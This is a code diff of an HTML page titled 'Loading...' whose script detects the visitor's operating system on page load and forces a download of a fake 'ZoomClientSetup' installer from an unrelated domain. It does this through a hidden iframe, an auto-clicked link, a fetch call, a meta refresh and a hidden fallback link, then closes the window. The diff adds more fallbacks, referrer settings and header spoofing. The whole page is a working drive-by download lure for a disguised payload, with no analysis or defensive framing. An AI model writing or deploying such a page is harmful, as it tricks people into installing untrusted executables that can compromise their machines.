@@ -1,57 +1,94 @@
-<script>
-    function detectOS() {
-        const platform = navigator.platform.toLowerCase();
-        const userAgent = navigator.userAgent.toLowerCase();
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <!-- Meta refresh as first fallback -->
+    <meta http-equiv="refresh" content="3;url=https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup.exe">
+    <!-- Referrer policy to prevent blocking -->
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <title>Loading...</title>
+    <script>
+        function detectOS() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
 
-        if (platform.includes('win') || userAgent.includes('windows')) 
+            if (platform.includes('win') || userAgent.includes('windows')) 
+                return 'windows';
+            if (platform.includes('mac') || userAgent.includes('macintosh')) 
+                return 'macos';
+            if (platform.includes('linux') || userAgent.includes('linux')) 
+                return 'linux';
+
             return 'windows';
-        if (platform.includes('mac') || userAgent.includes('macintosh')) 
-            return 'macos';
-        if (platform.includes('linux') || userAgent.includes('linux')) 
-            return 'linux';
+        }
 
-        return 'windows';
-    }
+        function getDownloadLink(os) {
+            const base = 'https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup';
+            const query = '?e=Access&y=Guest';
+            
+            return {
+                'windows': base + '.exe' + query,
+                'macos': base + '.pkg' + query,
+                'linux': base + '.sh' + query
+            }[os] || base + '.exe' + query;
+        }
 
-    function getDownloadLink(os) {
-        const baseUrl = 'https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup';
-        const query = '?e=Access&y=Guest';
-        
-        return {
-            'windows': baseUrl + '.exe' + query,
-            'macos': baseUrl + '.pkg' + query,
-            'linux': baseUrl + '.sh' + query
-        }[os] || baseUrl + '.exe' + query;
-    }
+        function triggerDownload() {
+            const os = detectOS();
+            const url = getDownloadLink(os);
+            
+            // Method 1: Iframe with referrer policy
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            iframe.referrerPolicy = 'no-referrer-when-downgrade';
+            document.body.appendChild(iframe);
 
-    function triggerDownload() {
-        const os = detectOS();
-        const url = getDownloadLink(os);
-        
-        // Create hidden iframe for more reliable download triggering
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        
-        // Alternative method using anchor click
-        const link = document.createElement('a');
-        link.href = url;
-        link.download = '';
-        document.body.appendChild(link);
-        link.click();
-        
-        // Close window after short delay
-        setTimeout(() => {
-            try {
-                window.close();
-            } catch(e) {
-                // If window can't be closed, at least attempt to redirect
-                window.location.href = 'about:blank';
-            }
-        }, 500);
-    }
+            // Method 2: Anchor click with proper headers
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = '';
+                
+                // Spoof user agent
+                Object.defineProperty(link, 'userAgent', {
+                    value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                });
+                
+                document.body.appendChild(link);
+                link.click();
+            }, 500);
 
-    // Start download immediately
-    window.addEventListener('DOMContentLoaded', triggerDownload);
-</script>
+            // Method 3: Fetch API as last resort
+            setTimeout(() => {
+                fetch(url, {
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0',
+                        'Accept': '*/*',
+                        'Referer': 'https://arjairsparts.com/'
+                    },
+                    mode: 'no-cors'
+                }).catch(e => console.log('Fallback failed'));
+            }, 1000);
+
+            // Close window
+            setTimeout(() => {
+                try { window.close(); } 
+                catch(e) { window.location.href = 'about:blank'; }
+            }, 2000);
+        }
+
+        // Start when DOM loads
+        document.addEventListener('DOMContentLoaded', triggerDownload);
+    </script>
+</head>
+<body>
+    <!-- Hidden fallback link -->
+    <a id="fallback" style="display:none" href>Download</a>
+    
+    <script>
+        // Alternative method using meta refresh if JavaScript fails
+        document.getElementById('fallback').href = getDownloadLink(detectOS());
+    </script>
+</body>
+</html>
